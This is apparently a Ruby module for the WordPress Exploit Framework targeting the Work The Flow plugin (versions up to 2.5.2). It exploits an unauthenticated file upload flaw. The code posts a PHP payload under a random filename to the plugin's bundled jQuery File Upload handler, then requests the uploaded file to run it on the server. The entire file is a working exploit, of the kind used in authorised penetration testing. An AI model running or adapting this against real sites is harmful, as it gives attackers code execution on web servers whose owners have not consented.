class Wpxf::Exploit::WorkTheFlowShellUpload < Wpxf::Module
  include Wpxf

  def initialize
    super

    update_info(
      name: 'Work The Flow Shell Upload',
      desc: 'This module exploits a file upload vulnerability in versions '\
            '<= 2.5.2 of the Work The Flow plugin which '\
            'allows unauthenticated users to upload and execute PHP scripts '\
            'in the context of the web server.',
      author: [
        'Claudio Viviani',                # Vulnerability discovery
        'Rob Carr <rob[at]rastating.com>' # WPXF module
      ],
      references: [
        ['WPVDB', '7883'],
        ['EDB', '36640']
      ],
      date: 'Mar 14 2015'
    )
  end

  def check
    check_plugin_version_from_readme('work-the-flow-file-upload', '2.5.3')
  end

  def plugin_url
    normalize_uri(
      wordpress_url_plugins,
      'work-the-flow-file-upload',
      'public',
      'assets',
      'jQuery-File-Upload-9.5.0',
      'server',
      'php'
    )
  end

  def uploader_url
    normalize_uri(plugin_url, 'index.php')
  end

  def payload_body_builder(payload_name)
    builder = Utility::BodyBuilder.new
    builder.add_field('action', 'upload')
    builder.add_file_from_string('files', payload.encoded, payload_name)
    builder
  end

  def run
    return false unless super

    emit_info 'Preparing payload...'
    payload_name = "#{Utility::Text.rand_alpha(rand(5..10))}.php"
    builder = payload_body_builder(payload_name)

    emit_info 'Uploading payload...'
    res = nil
    builder.create do |body|
      res = execute_post_request(url: uploader_url, body: body)
    end

    if res.nil? || res.timed_out?
      emit_error 'No response from the target'
      return false
    end

    if res.code != 200
      emit_info "Response code: #{res.code}", true
      emit_info "Response body: #{res.body}", true
      emit_error 'Failed to upload payload'
      return false
    end

    payload_url = normalize_uri(plugin_url, 'files', payload_name)
    emit_success "Uploaded the payload to #{payload_url}", true

    emit_info 'Executing the payload...'
    res = execute_get_request(url: payload_url)
    if res && res.code == 200 && !res.body.strip.empty?
      emit_success "Result: #{res.body}"
    end

    return true
  end
end
